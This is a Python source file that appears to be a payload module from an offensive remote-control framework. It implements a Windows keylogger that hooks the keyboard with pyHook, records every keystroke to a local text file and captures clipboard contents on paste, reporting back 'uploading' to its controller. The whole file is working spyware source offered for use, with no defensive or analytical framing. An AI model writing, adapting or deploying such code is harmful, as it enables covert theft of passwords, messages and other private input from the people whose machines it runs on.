'''
payload
about: Logs key presses to a text file
usage: logit.log_it()
author:jak hax
'''
import os
import sys
from payloads.absract_payload_handler import AbstractPayloadHandler
from utils.debug_error_handler import ErrorLogHandler

error_logger= ErrorLogHandler()

class WindowsFileKeyLogPayloadHandler(AbstractPayloadHandler):
    
	def write_to_file(self,data):
		with open(self.log_file,"a") as infile:
			infile.write(data)

	def execute_payload(self, data):
		try:
			from lxml import html
			import pythoncom
			import pyHook
			self.log_file=os.path.join(os.getcwd(), "logan.txt")
			obj = pyHook.HookManager()
			obj.KeyDown = self.keypressed
			obj.HookKeyboard()
			pythoncom.PumpMessages()
			return "Command execution successful, uploading\n"
		except Exception as e:
			error_logger.logError(sys.exc_info(), e, True)
			return "Command execution unsuccessful: {}\n".format(str(e))

	def keypressed(self,event):
		a=event.Ascii
		event_ignore=[1,3,19,0,24]
		sp_keys={
			13:"\n",
			8:"<BS>",
			9:"\t",
			27:"<ESC>\n",
			22:"\n START CLIPBOARD\n{}\n END CLIPBOARD\n".format(pyperclip.paste())
		}
		if a in event_ignore:
			pass
		elif a in [i for i in sp_keys.keys()]:
			self.write_to_file(sp_keys[a])
		else:
			self.write_to_file(chr(a))